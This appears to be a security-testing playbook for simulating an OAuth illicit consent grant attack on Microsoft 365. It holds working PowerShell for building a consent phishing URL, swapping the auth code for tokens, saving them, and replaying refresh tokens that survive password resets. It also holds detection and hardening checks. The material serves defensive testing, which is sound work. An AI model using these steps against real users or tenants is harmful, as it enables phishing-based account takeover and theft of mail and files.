# 01 - OAuth Illicit Consent Grant Test

## What this tests

A malicious multi-tenant app requests delegated Graph permissions. The victim consents via a legitimate Microsoft consent page. The attacker receives refresh tokens that:
- Are **not device-bound** (Token Protection doesn't apply)
- Are **not subject to CAE strict location** the same way as session tokens
- **Survive password resets** until refresh tokens are explicitly revoked

## Recommended tool

**GraphRunner** — actively maintained, covers this exact attack and a lot more.
- Repo: https://github.com/dafthack/GraphRunner
- Relevant cmdlet: `Invoke-InjectOAuthApp`, `Invoke-GraphRecon`, `Get-AzureAppTokens`

Why use it instead of a custom script: it's tested against current Microsoft changes, you get adjacent recon/enumeration cmdlets that map to the post-compromise stage of the test, and any detection signatures already cataloged for GraphRunner are usable as known-bad baseline for your KQL queries.

## Test procedure

### 1. Register the test app

In your **attacker tenant** (separate dev tenant — free to spin up), or in the victim tenant if testing the "internal compromise" angle:

```
Entra admin → App registrations → New registration
  Name: "Productivity Insights"   (deliberately innocuous)
  Account types: Multitenant
  Redirect URI: Web → https://localhost/   (or your test domain)
```

In the app blade:
- Certificates & secrets → New client secret → save value
- API permissions → Add → Microsoft Graph → Delegated:
  - `Mail.Read`
  - `Files.Read.All`
  - `User.Read`
  - `offline_access`
- **Do NOT click "Grant admin consent"** — the test point is whether the victim grants it.

### 2. Run GraphRunner

```powershell
Import-Module .\GraphRunner.ps1
# Generate the consent URL with your app's CLIENT_ID
# GraphRunner has helpers for this; or build manually:
$url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" +
       "client_id=<APP_ID>&response_type=code&" +
       "redirect_uri=https://localhost/&response_mode=query&" +
       "scope=Mail.Read%20Files.Read.All%20User.Read%20offline_access&state=test"
```

### 3. Deliver and capture

Send the URL to your victim test user (via whatever phishing pretext you'd see in a real campaign — but keep your message log so you can later validate that anti-phishing controls did/didn't block it).

After the victim accepts, the redirect URL will include `?code=<authcode>`. Exchange it:

```powershell
$body = @{
    client_id     = "<APP_ID>"
    client_secret = "<SECRET>"
    grant_type    = "authorization_code"
    code          = "<AUTH_CODE_FROM_REDIRECT>"
    redirect_uri  = "https://localhost/"
    scope         = "Mail.Read Files.Read.All User.Read offline_access"
}
$tokens = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$tokens | ConvertTo-Json | Out-File "captured_$(Get-Date -Format yyyyMMddHHmmss).json"
```

You now have `access_token` and `refresh_token`. Verify with one Graph call:

```powershell
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" `
  -Headers @{Authorization = "Bearer $($tokens.access_token)"}
```

### 4. Persistence test (the important part)

After capture, test these scenarios with the refresh token:

| Test | Method | Expected |
|---|---|---|
| Still works in 1 hour | refresh_token grant → new access token | ✅ |
| Still works in 24 hours | Same | ✅ |
| Survives victim password reset | Reset password in Entra → try refresh | ⚠️ **Yes — this is the key finding** |
| Survives `Revoke-MgUserSignInSession` | Call cmdlet → try refresh | Depends — verify behavior |
| Survives explicit refresh token revocation | `Revoke-MgUserSignInSession` + new password | Should fail |
| Blocked by CA "Block legacy auth" | n/a — this is modern OAuth | Not blocked |

Refresh token replay:
```powershell
$body = @{
    client_id     = "<APP_ID>"
    client_secret = "<SECRET>"
    grant_type    = "refresh_token"
    refresh_token = "<REFRESH_FROM_CAPTURED_FILE>"
    scope         = "Mail.Read Files.Read.All offline_access"
}
Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
```

## What to check after each test

- Did the victim see ANY warning about an unverified/non-publisher-verified app on the consent screen?
- Did the consent succeed silently or require admin approval?
- Did Defender for Cloud Apps app governance fire any alert?
- Did Identity Protection flag the user/sign-in as risky?
- Run KQL queries from `05-detection/` — which fired and how fast?

## Hardening (test these next, see if attack still works)

- Set user consent: "Allow user consent for apps from verified publishers, for selected permissions"
- Enable admin consent workflow
- App Governance policies in Defender (alerts on `Mail.Read` consent etc.)
- Periodically run `Get-MgUserOauth2PermissionGrant` against all users to audit consents
